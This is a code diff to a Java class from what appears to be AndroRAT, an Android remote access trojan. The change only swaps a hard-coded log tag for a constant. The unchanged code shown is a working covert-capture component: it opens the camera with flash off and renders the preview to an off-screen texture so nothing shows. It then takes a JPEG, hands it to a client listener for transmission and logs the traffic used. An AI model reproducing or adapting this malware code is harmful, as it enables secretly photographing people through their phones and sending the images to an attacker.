@@ -31,7 +31,7 @@ import android.webkit.WebView.FindListener;
 import android.widget.ImageView;
 
 public class PhotoTakerFront implements Camera.PictureCallback {
-
+	private static final String TAG = "AndroRAT";
 	Camera cam;
 	ClientListener ctx;
 	int chan;
@@ -51,14 +51,14 @@ public class PhotoTakerFront implements Camera.PictureCallback {
 	public boolean takePhoto() throws InterruptedException {
 		if (!(ctx.getApplicationContext().getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)))
 			return false;
-		Log.i("CAMERA", "la fotocamera  presente");
+		Log.i(TAG, "la fotocamera  presente");
 
 		int cameraId = -1;
 		int numberOfCameras = Camera.getNumberOfCameras();
 		for (int i = 0; i < numberOfCameras; i++) {
 			CameraInfo info = new CameraInfo();
 			Camera.getCameraInfo(i, info);
-			Log.i("CAMERA", "Hai a disposizione la camera: " + Integer.toString(i));
+			Log.i(TAG, "Hai a disposizione la camera: " + Integer.toString(i));
 		}
 		try {
 			cam = Camera.open(0);
@@ -66,54 +66,54 @@ public class PhotoTakerFront implements Camera.PictureCallback {
 			return false;
 		}
 
-		Log.i("CAMERA", "fotocamera aperta correttamente");
+		Log.i(TAG, "fotocamera aperta correttamente");
 
 		try {
 			cam.setPreviewTexture(new SurfaceTexture(10));
 		} catch (IOException e1) {
-			Log.i("CAMERA", "problema a creare la surfaceTexture");
+			Log.i(TAG, "problema a creare la surfaceTexture");
 		}
-		Log.i("CAMERA", "surfacetexture creata correttamente");
+		Log.i(TAG, "surfacetexture creata correttamente");
 		Parameters params = cam.getParameters();
 		params.setPreviewSize(640, 480);
-		Log.i("CAMERA", "preview impostata");
+		Log.i(TAG, "preview impostata");
 		params.setFlashMode(Camera.Parameters.FLASH_MODE_OFF);
-		Log.i("CAMERA", "flash impostato");
+		Log.i(TAG, "flash impostato");
 		params.setPictureFormat(ImageFormat.JPEG);
 		params.setJpegQuality(30);
-		Log.i("CAMERA", "formato impostato");
+		Log.i(TAG, "formato impostato");
 		cam.setParameters(params);
-		Log.i("CAMERA", "parametri inviati alla fotocamera");
+		Log.i(TAG, "parametri inviati alla fotocamera");
 		cam.startPreview();
-		Log.i("CAMERA", "mi metto a dormire");
+		Log.i(TAG, "mi metto a dormire");
 		// Thread.sleep(30000);
-		Log.i("CAMERA", "la preview pronta; mi sveglio");
+		Log.i(TAG, "la preview pronta; mi sveglio");
 		cam.takePicture(null, null, null, this);
 		return true;
 	}
 
 	public void onPictureTaken(byte[] data, Camera camera) {
 		// TODO Auto-generated method stub
-		Log.i("CAMERA", "fotografia scattata");
+		Log.i(TAG, "fotografia scattata");
 		ctx.handleData(chan, data);
-		Log.i("CAMERA", "fotografia inviata");
+		Log.i(TAG, "fotografia inviata");
 		camera.stopPreview();
 		camera.release();
 		cam = null;
-		Log.i("CAMERA", "camera distrutta");
+		Log.i(TAG, "camera distrutta");
 		int pid = android.os.Process.myUid();
 		ProcessRX = TrafficStats.getUidRxBytes(pid);
 
 		ProcessTX = TrafficStats.getUidTxBytes(pid);
 		ProcessRX = ProcessRX / 1048576;
 		ProcessTX = ProcessTX / 1048576;
-		Log.i("CAMERA", "dati ricevuti: " + ProcessRX + "; dati inviati: " + ProcessTX);
+		Log.i(TAG, "dati ricevuti: " + ProcessRX + "; dati inviati: " + ProcessTX);
 		GlobalRX = TrafficStats.getMobileRxBytes();
 
 		GlobalTX = TrafficStats.getMobileTxBytes();
 		GlobalRX = GlobalRX / 1048576;
 		GlobalTX = GlobalTX / 1048576;
-		Log.i("CAMERA", "dati ricevuti: " + GlobalRX + "; dati inviati: " + GlobalTX);
+		Log.i(TAG, "dati ricevuti: " + GlobalRX + "; dati inviati: " + GlobalTX);
 	}
 
 }
